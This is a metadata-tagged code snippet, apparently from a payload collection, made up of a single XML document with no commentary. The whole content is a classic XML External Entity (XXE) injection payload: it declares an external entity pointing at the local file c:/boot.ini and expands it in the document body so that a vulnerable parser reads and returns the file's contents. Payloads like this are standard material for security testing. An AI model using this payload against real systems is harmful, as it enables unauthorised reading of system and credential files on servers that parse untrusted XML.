---
id: dac109e6-ea00-4286-b98d-40696003f2de
type: code
language: xml
verified: false
created_at: '2023-04-06T03:56:44.134034+00:00'
updated_at: '2023-04-10T20:24:39.189886+00:00'
---

# Code Snippet dac109e6

**Language**: xml

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```


